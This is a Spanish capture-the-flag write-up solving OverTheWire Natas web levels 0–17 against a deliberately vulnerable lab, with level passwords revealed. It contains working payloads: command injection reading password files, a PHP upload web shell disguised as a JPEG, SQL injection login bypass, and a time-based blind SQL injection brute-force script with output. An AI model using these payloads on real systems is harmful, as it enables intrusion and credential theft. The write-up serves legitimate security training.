
# Natas

{% hint style="danger" %}
**DISCLAIMER**: Esta página contiene spoilers sobre el juego y sus diferentes niveles. Como hackers éticos debéis intentar pensar "Out of the Box" y resolver los niveles con vuestros propios conocimientos y investigaciones.
{% endhint %}

Cada nivel de natas consta de su propio sitio web ubicado en `http://natasX.natas.labs.overthewire.org`, donde X es el número de nivel. No hay inicio de sesión SSH. Para acceder a un nivel, ingrese el nombre de usuario de ese nivel (por ejemplo, natas0 para el nivel 0) y su contraseña.&#x20;

Cada nivel tiene acceso a la contraseña del siguiente nivel. Tu trabajo es obtener de alguna manera la siguiente contraseña y subir de nivel.&#x20;

Todas las contraseñas también se almacenan en `/etc/natas_webpass/`. P.ej. la contraseña para natas5 se almacena en el archivo `/etc/natas_webpass/natas5` y solo puede ser leída por natas4 y natas5.&#x20;

Empieza aqui:

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

## <mark style="color:purple;">Natas 0</mark>

<figure><img src="/files/34Xmc9KmEGNmBX0F7Zmc" alt=""><figcaption></figcaption></figure>

Click derecho > ver código fuente

<figure><img src="/files/XliiEGI42VxBbTEqogrK" alt=""><figcaption></figcaption></figure>

```
<!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 -->
```

## <mark style="color:purple;">Natas 1</mark>

Lo mismo que el nivel anterior

<figure><img src="/files/tw5XPbaNaw7BWOVrbJq7" alt=""><figcaption></figcaption></figure>

Pone que el click derecho está bloqueado pero no lo está xD

<figure><img src="/files/x91fEZIczaIE3EXV7a17" alt=""><figcaption></figcaption></figure>

```
<!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 -->
```

## <mark style="color:purple;">Natas 2</mark>

<figure><img src="/files/9G2Isb40HpriUyywUrcb" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/4QypXfWjB2FQUUmCbHWv" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/npLOvPrjYBF8znkFHgv0" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/amX9UO6a5GQg0Mw4ODPZ" alt=""><figcaption></figcaption></figure>

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

## <mark style="color:purple;">Natas 3</mark>

<figure><img src="/files/mOqj435pUE9CGGSuqHF4" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/svmpKOD2RPTawK2nfK3Y" alt=""><figcaption></figcaption></figure>

Inspeccionando el archivo `robots.txt` de la raiz obtenemos un directorio `/s3cre3t`

<figure><img src="/files/YlH6QAwTFJ8V2GcSt5qi" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/3GtJSscHvyfdV8m3NloO" alt=""><figcaption></figcaption></figure>

{% code title="users.txt" %}

```
natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
```

{% endcode %}

## <mark style="color:purple;">Natas 4</mark>

<figure><img src="/files/Qc1FX8zb7WCuqAWEt7Cb" alt=""><figcaption></figcaption></figure>

El mensaje indica que estás intentando acceder desde una URL no autorizada. Para superar este desafío necesitarás modificar la solicitud HTTP para que parezca que proviene de la URL autorizada. Puedes hacer esto manipulando la cabecera "Referer" de la solicitud.

```bash
curl -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/
```

<figure><img src="/files/zpFlRgmXJYcDaiaE7POT" alt=""><figcaption></figcaption></figure>

```bash
curl -u natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm -e "http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/
```

<figure><img src="/files/VBQj9bO4kwhOmR0pC9Q4" alt=""><figcaption></figcaption></figure>

```
The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
```

## <mark style="color:purple;">Natas 5</mark>

<figure><img src="/files/Rp3LfEcapNJfzFvY5Pcl" alt=""><figcaption></figcaption></figure>

Para resolver este reto, debemos activar el **proxy** en nuestro navegador para que las peticiones pasen por Burp Suite. Yo tengo habilitado el plugin FoxyProxy para que la conexión sea más facil e intuitiva.

<figure><img src="/files/SuCgpa4ADpVIE5nBSsQb" alt=""><figcaption></figcaption></figure>

Recargamos la página y se envia la petición a BurpSuite

<figure><img src="/files/opNRk9oB1AfPncOA4tga" alt=""><figcaption></figcaption></figure>

Vemos el parámetro `loggedin=0`, lo mandamos al repeater y cambiamos el 0 por 1

<figure><img src="/files/NLvzi8ybf9Pi4bhD0JjA" alt=""><figcaption></figcaption></figure>

```
The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
```

## <mark style="color:purple;">Natas 6</mark>

<figure><img src="/files/KCKQm5SkbF8DLMY7JPHU" alt=""><figcaption></figcaption></figure>

En el código fuente nos encontramos con un script en php:

```php
<?
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

Encontramos el directorio `/includes/secret.inc` asi que vamos a acceder

<figure><img src="/files/VcLiJmc6ZecZmLVphjmx" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/y6GRohosrQlRxKpTBpiP" alt=""><figcaption></figcaption></figure>

```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Copiamos la cadena de texto y la enviamos como query desde el index:

<figure><img src="/files/5Ns5LIOpDH973ZhVDHpy" alt=""><figcaption></figcaption></figure>

```
The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
```

## <mark style="color:purple;">Natas 7</mark>

<figure><img src="/files/J3PkTUTGgBxA7ZxdCtpr" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/dltE5NnmXVjegWpTjob3" alt=""><figcaption></figcaption></figure>

En el código fuente encontramos una pista:

```html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

<figure><img src="/files/0WYkyQYZwX8grrAmtbEH" alt=""><figcaption></figcaption></figure>

Si hacemos click en los enlaces del index vemos que añade parámetros a la URL

<figure><img src="/files/Wvzo87oduGZo0jSGEFBq" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/nIdAwrN6UERQmiVyoyLs" alt=""><figcaption></figcaption></figure>

```
Password Natas 8: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB 
```

## <mark style="color:purple;">Natas 8</mark>

<figure><img src="/files/lA8xHwXBQhlxg9dRpu9M" alt=""><figcaption></figcaption></figure>

En el código fuente nos encontramos este script en php:

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

El código PHP proporcionado realiza una codificación del secreto mediante la función encodeSecret. La codificación implica tres pasos:

1. `base64_encode`: Codificación Base64 del secreto.&#x20;
2. `strrev`: Reversión de la cadena resultante.&#x20;
3. `bin2hex`: Conversión de la cadena binaria a hexadecimal. El valor codificado es comparado con $encodedSecret, y si coinciden, se imprime el mensaje "Access granted. The password for natas9 is ".

Para obtener el password del siguiente nivel, necesitas realizar la operación inversa. Aquí hay un ejemplo de cómo hacerlo en PHP:

```bash
nano query.php
```

{% code title="query.php" %}

```php
<?php
function decodeSecret($encodedSecret) {
    // Realiza las operaciones inversas en orden inverso
    $decodedSecret = base64_decode(strrev(hex2bin($encodedSecret)));
    return $decodedSecret;
}

// El valor codificado proporcionado
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

// Decodifica el secreto
$decodedSecret = decodeSecret($encodedSecret);

echo "Decoded Secret: $decodedSecret";
?>
```

{% endcode %}

```php
❯ php query.php
Decoded Secret: oubWYf2kBq
```

Introducimos el decoded secret en el index y nos devuelve el password:

<figure><img src="/files/CosorqEGR8mds7KvkkDU" alt=""><figcaption></figcaption></figure>

```
The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
```

## <mark style="color:purple;">Natas 9</mark>

<figure><img src="/files/q3kLvMeY8lZD4Ydj1ctS" alt=""><figcaption></figcaption></figure>

En el código fuente encontramos el siguiente script en php:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

Al enviar una petición por el buscador vemos que añade parámetros a la URL:

<figure><img src="/files/KKDRwVnO3OvYOQelkK2x" alt=""><figcaption></figcaption></figure>

Dado que el código utiliza passthru y la búsqueda se realiza mediante grep, podríamos intentar una inyección de comandos a través del valor de needle.

```bash
; cat /etc/natas_webpass/natas10 #
```

<figure><img src="/files/PhGulKmI9RoH2lsmQegq" alt=""><figcaption></figcaption></figure>

```
The password for natas10 is D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
```

## <mark style="color:purple;">Natas 10</mark>

<figure><img src="/files/jbdwCBaYgTCsm2pzMzSG" alt=""><figcaption></figcaption></figure>

En el codigo fuente nos encontramos este script en php:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

Dado que ciertos caracteres han sido filtrados y el script utiliza `preg_match` para verificar si hay caracteres ilegales, podríamos intentar eludir esta restricción.

Con esta query:&#x20;

```bash
a /etc/natas_webpass/natas11
```

Podemos suponer que enviará el comando:

```bash
grep -i a /etc/natas_webpass/natas11 diccionario.txt
```

buscando tanto en “/etc/natas\_webpass/natas11” como en “dictionary.txt” la letra a, lo que nos debería devolver el password de natas11

<figure><img src="/files/FZ8WJ85Ma5gjmr6OHveb" alt=""><figcaption></figcaption></figure>

```
El password de natas11 es 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
```

## <mark style="color:purple;">Natas 11</mark>

<figure><img src="/files/E2qUcOONrdahlMQ9MpAD" alt=""><figcaption></figcaption></figure>

Al loguearnos nos dice que las cookies están protegidas con enciptación XOR. En el código fuente encontramos el siguiente script:

```php
<?
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);

?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>
<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
?>
```

Este código PHP está cifrando y descifrando cookies usando XOR encryption. La función `xor_encrypt` realiza la operación XOR entre cada caracter del texto y la clave. A continuación, te explico cómo funciona el código:

Para obtener la cookie data vamos al inspector > Stogare y copiamos el valor "Value"

<figure><img src="/files/9qlF0nowvLpwyva4BhPu" alt=""><figcaption></figcaption></figure>

Reutilizando la función `xor_encrypt` del código original, podemos pasarle la cookie `data` e indicando que la variable `$key` será `$defaultdata` (codificada en json):

{% code title="xor.php" %}

```php
<?php
	function xor_encrypt_2($in) {
		$key = base64_decode("MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D");
		$text = $in;
		$outText = '';

		// Iterate through each character
		for($i=0;$i<strlen($text);$i++) {
			$outText .= $text[$i] ^ $key[$i % strlen($key)];
		}
		return $outText;
	}

	$mydata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff" );
	$mydata_json = json_encode($mydata);
	$mydata_enc = xor_encrypt_2($mydata_json);
	echo $mydata_enc;
?>
```

{% endcode %}

El resultado de ejecutar este código, nos devolverá la **clave** para obtener nuestra contraseña:

```bash
> php xor.php
KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLK%
```

Vemos al repetición del patrón KNHL

Ahora debemos fijarnos que para que se muestre la **clave**, la opción `showpassword` debe ser igual a **yes**.

```php
<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>
```

Igual que antes, reutilizando la función `xor_encrypt` ahora le asignamos a la variable `$key` el valor de la **clave** obtenida anteriormente.

{% code title="xor.php" %}

```php
<?php
	function xor_encrypt_2($in) {
		//$key = base64_decode("MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D");
		$key = "KNHL";
		$text = $in;
		$outText = '';

		// Iterate through each character
		for($i=0;$i<strlen($text);$i++) {
			$outText .= $text[$i] ^ $key[$i % strlen($key)];
		}
		return $outText;
	}

	$mydata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff" );
	$mydata_json = json_encode($mydata);
	$mydata_enc = xor_encrypt_2($mydata_json);
	$mydata_b64 = base64_encode($mydata_enc);
	echo $mydata_b64;
?>
```

{% endcode %}

```bash
❯ php xor.php
MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz
```

Lo enviamos por curl como una nueva cookie:

{% code overflow="wrap" %}

```bash
curl -u usuario:password -b data=<cookie-modificada> url

curl -u natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg -b data=MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz% http://natas11.natas.labs.overthewire.org
```

{% endcode %}

```
...SNIP...
<h1>natas11</h1>
<div id="content">
<body style="background: #ffffff;">
Cookies are protected with XOR encryption<br/><br/>

The password for natas12 is YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
```

También se puede editar la cookie desde el navegador y actualizar la página:

<figure><img src="/files/7J8uuOGF8HfJkFahUkaj" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Natas 12</mark>

<figure><img src="/files/hRgGZfC8E8mw98tWZfKm" alt=""><figcaption></figcaption></figure>

En el codigo fuente nos encontramos este código en php:

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

El script le da un nombre random a los ficheros que se suben, y lo limita a 1kb de peso.

Vamos a crear un archivo `exploit.php` con el siguiente código, esto ejecutará automáticamente lo que le indiquemos, en este caso el password de natas13:

{% code title="exploit.php" %}

```php
<?php
echo shell_exec("cat /etc/natas_webpass/natas13");
?>
```

{% endcode %}

Lo enviamos por curl:

{% code overflow="wrap" %}

```bash
curl -u natas12:YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG -F "filename=exploit.php" -F "uploadedfile=@exploit.php" http://natas12.natas.labs.overthewire.org/index.php
```

{% endcode %}

```html
...SNIP...
<div id="content">
The file <a href="upload/j4npq11ths.php">upload/j4npq11ths.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>           |---------------------|
```

Accedemos al directorio `/upload/j4npq11ths.php` y obtenemos la contraseña:

<figure><img src="/files/yzORTDAUXXUYmR2VMgWX" alt=""><figcaption></figcaption></figure>

```
natas13 password: lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
```

## <mark style="color:purple;">Natas 13</mark>

<figure><img src="/files/Lq7pnYYADaIbno4saqEp" alt=""><figcaption></figcaption></figure>

En el codigo fuente nos encontramos con este codigo en php:

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

Este código PHP está diseñado para manejar la subida de archivos al servidor. Aquí hay una descripción de las funciones y la lógica del código:

1. `genRandomString`: Genera una cadena aleatoria de longitud 10 compuesta por caracteres alfanuméricos (0-9, a-z).
2. `makeRandomPath`: Crea una ruta de archivo aleatoria en el directorio "upload" utilizando la función genRandomString y la extensión proporcionada como argumento. Asegura que el archivo no exista previamente en ese directorio.
3. `makeRandomPathFromFilename`: Toma un nombre de archivo como argumento, extrae la extensión usando pathinfo, y luego llama a makeRandomPath para generar una ruta de archivo aleatoria.
4. El código verifica si el formulario se ha enviado (array\_key\_exists("filename", $\_POST)). Si es así, procede a procesar el archivo.

* Comprueba si el tamaño del archivo supera el límite de `1000 bytes` (filesize($\_FILES\['uploadedfile']\['tmp\_name']) > 1000). Si es así, imprime un mensaje indicando que el archivo es demasiado grande.
* Utiliza `exif_imagetype` para verificar si el archivo es una imagen. Si no es una imagen válida, imprime un mensaje indicando que el archivo no es una imagen.
* Si pasa todas las verificaciones, mueve el archivo temporalmente cargado a la ruta generada aleatoriamente y muestra un mensaje indicando que el archivo se ha subido correctamente.

Al igual que en el reto anterior, podemos crear el fichero `natas13.jpg` con el siguiente código para que se muestre el contenido del fichero `/etc/natas_webpass/natas14`, pero esta vez debemos utilizar una extensión `.jpg` de imagen.

```php
<?php echo exec("cat /etc/natas_webpass/natas14"); ?>
```

```bash
# Dejamos 4 espacios al inicio, que los cambiaremos por null bytes
echo '    <?php echo exec("cat /etc/natas_webpass/natas14"); ?>' > natas13.jpg
```

Pero si intentamos subir este fichero va a **detectar que no es una imagen**, ya que no sólo se comprueba la extensión del fichero, sino que comprueba que contenga una **firma de tipo JPG**.

Esto lo podemos hacer con el editor [hexeditor](http://manpages.org/hexeditor):

```
hexeditor -b natas13.jpg
```

Primero debemos insertar [null bytes](https://en.wikipedia.org/wiki/Null_character), esto lo podemos hacer presionando 4 veces `Ctrl + A`. Luego podemos sustituir estos *null bytes* por los valores `FF D8 FF DB` (por ejemplo), y presionamos `Ctrl + X` para guardar y salir.

<figure><img src="/files/RcAcUfKh3kS07EESudo0" alt=""><figcaption></figcaption></figure>

Antes de darle a upload cambiamos la extensión del archivo a php desde el inspector:

<figure><img src="/files/fQGsuXSMOdcv46OrUeNc" alt=""><figcaption></figcaption></figure>

Le damos a upload y nos crea el directorio correctamente, con el archivo con extensión .php

<figure><img src="/files/6RkDaGcJRiJzrnFEQhBM" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/3S2FAFoGym1wrzkmDwc9" alt=""><figcaption></figcaption></figure>

```
Password natas14: qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
```

## <mark style="color:purple;">Natas 14</mark>

<figure><img src="/files/VnBVb1eayUnXl3thZxLN" alt=""><figcaption></figcaption></figure>

En el condigo fuente nos encontramos este script en php:

```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>
```

<figure><img src="/files/QnYp2JQEi1NgiAnSxAfW" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/yjy0GocxnxGoQCQhxvcH" alt=""><figcaption></figcaption></figure>

```bash
username=1" OR "1" = "1" -- &password=foo
```

<figure><img src="/files/kTo1OAJV0TkrTmeTnII8" alt=""><figcaption></figcaption></figure>

```
The password for natas15 is TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
```

## <mark style="color:purple;">Natas 15</mark>

<figure><img src="/files/t5JXHXYek43x4iZSOQzU" alt=""><figcaption></figcaption></figure>

En el codigo fuente nos encontramos este script en php:

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

Intentando varias inyeccions SQL ninguna resultó con éxito. Buscando por internet encontré este script, hecho a medida para hacer bruteforce de este nivel:

{% embed url="<https://github.com/oddworldng/natas15-php-overthewire>" %}

```bash
nano natas15.php

# Define connection params
$url = "http://natas15.natas.labs.overthewire.org/index.php?debug";
$username = "natas15";
$password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"; <-- Editar password
```

<pre class="language-shell-session"><code class="lang-shell-session"><strong>> php natas15.php
</strong>Checking chars in password ...
Characters filtered: adfgijklqruADEHOPRTVZ23579
Using brute force to get final password ...
T
TR
TRD
TRD7
TRD7i
TRD7iZ
TRD7iZr
TRD7iZrd
TRD7iZrd5
TRD7iZrd5g
TRD7iZrd5gA
TRD7iZrd5gAT
TRD7iZrd5gATj
TRD7iZrd5gATjj
TRD7iZrd5gATjj9
TRD7iZrd5gATjj9P
TRD7iZrd5gATjj9Pk
TRD7iZrd5gATjj9PkP
TRD7iZrd5gATjj9PkPE
TRD7iZrd5gATjj9PkPEu
TRD7iZrd5gATjj9PkPEua
TRD7iZrd5gATjj9PkPEuaO
TRD7iZrd5gATjj9PkPEuaOl
TRD7iZrd5gATjj9PkPEuaOlf
TRD7iZrd5gATjj9PkPEuaOlfE
TRD7iZrd5gATjj9PkPEuaOlfEj
TRD7iZrd5gATjj9PkPEuaOlfEjH
TRD7iZrd5gATjj9PkPEuaOlfEjHq
TRD7iZrd5gATjj9PkPEuaOlfEjHqj
TRD7iZrd5gATjj9PkPEuaOlfEjHqj3
TRD7iZrd5gATjj9PkPEuaOlfEjHqj32
TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
Password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
</code></pre>

## <mark style="color:purple;">Natas 16</mark>

<figure><img src="/files/hMmn3ZKLv8aJBYP5EKvR" alt=""><figcaption></figcaption></figure>

En el codigo fuente encontramos este código en php:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

Si analizamos el **código**, observamos que se han definido una serie de caracteres que no podrán ser introducidos. También podemos observar que se realiza una búsqueda en el fichero `dictionary.txt`, esta búsqueda se realiza utilizando la función passthru de PHP. Por último, la URL deberá de contener la clave `needle`.

La forma de realizar un ataque a este código, es realizar un ataque a ciegas por inyección SQL, en inglés, **Blind SQL injection**, como hicimos en el ejemplo anterior.

Para que eso funcione, necesitamos encontrar una manera de responder a la **pregunta** ¿tiene la contraseña, almacenada en `/etc/natas_webpass/natas17`, la letra `a`? .

Una forma es el hecho de que muestra datos si existe una subcadena, de lo contrario devuelve un contenido vacío.

Para ello, el equipo de Init0 (ciberseguridad) ha desarrollado el siguiente **script en PHP**: <https://github.com/oddworldng/natas16-php-overthewire>

```bash
nano natas16.php

# Define connection params
$username = "natas16";
$password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"; <-- Editar password
```

```
> php natas16.php
Checking chars in password ...
Characters filtered: bdhkmnsuvBCEHIKLRSUX0179
Using brute force to get final password ...
X
Xk
XkE
XkEu
XkEuC
XkEuCh
XkEuChE
XkEuChE0
XkEuChE0S
XkEuChE0Sb
XkEuChE0Sbn
XkEuChE0SbnK
XkEuChE0SbnKB
XkEuChE0SbnKBv
XkEuChE0SbnKBvH
XkEuChE0SbnKBvH1
XkEuChE0SbnKBvH1R
XkEuChE0SbnKBvH1RU
XkEuChE0SbnKBvH1RU7
XkEuChE0SbnKBvH1RU7k
XkEuChE0SbnKBvH1RU7ks
XkEuChE0SbnKBvH1RU7ksI
XkEuChE0SbnKBvH1RU7ksIb
XkEuChE0SbnKBvH1RU7ksIb9
XkEuChE0SbnKBvH1RU7ksIb9u
XkEuChE0SbnKBvH1RU7ksIb9uu
XkEuChE0SbnKBvH1RU7ksIb9uuL
XkEuChE0SbnKBvH1RU7ksIb9uuLm
XkEuChE0SbnKBvH1RU7ksIb9uuLmI
XkEuChE0SbnKBvH1RU7ksIb9uuLmI7
XkEuChE0SbnKBvH1RU7ksIb9uuLmI7s
XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
Password: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
```

## <mark style="color:purple;">Natas 17</mark>

<figure><img src="/files/b0xjveA20NopBqkvRpnS" alt=""><figcaption></figcaption></figure>

En el codigo fuente nos encontramos este script:

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

* Observamos que la tabla `users` contiene `username` y `password`
* No muestra ninguna salida a nuestra petición

```python
import requests  
from requests.auth import HTTPBasicAuth  
  
Auth=HTTPBasicAuth('natas17', 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd')  
headers = {'content-type': 'application/x-www-form-urlencoded'}  
filteredchars = ''  
passwd = ''  
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'  
  
for char in allchars:  
        payload = 'username=natas18%22+and+password+like+binary+%27%25{0}%25%27+and+sleep%281%29+%23'.format(char)  
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=payload, headers=headers)  
        if(r.elapsed.seconds >= 1):  
                filteredchars = filteredchars + char  
                print(filteredchars)  
  
print(filteredchars)  
  
for i in range(0,32):  
        for char in filteredchars:  
                payload = 'username=natas18%22%20and%20password%20like%20binary%20\'{0}%25\'%20and%20sleep(1)%23'.format(passwd + char)  
                r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=payload, headers=headers)  
                if(r.elapsed.seconds >= 1):  
                        passwd = passwd + char  
                        print(passwd)  
                        break  
```

```
python3 brute.py
a
ag
agk
agkn
agkno
agknoq
agknoqu
agknoquv
agknoquvw
agknoquvwx
agknoquvwxD
agknoquvwxDE
agknoquvwxDEF
agknoquvwxDEFG
agknoquvwxDEFGJ
agknoquvwxDEFGJL
agknoquvwxDEFGJLN
agknoquvwxDEFGJLNP
agknoquvwxDEFGJLNPQ
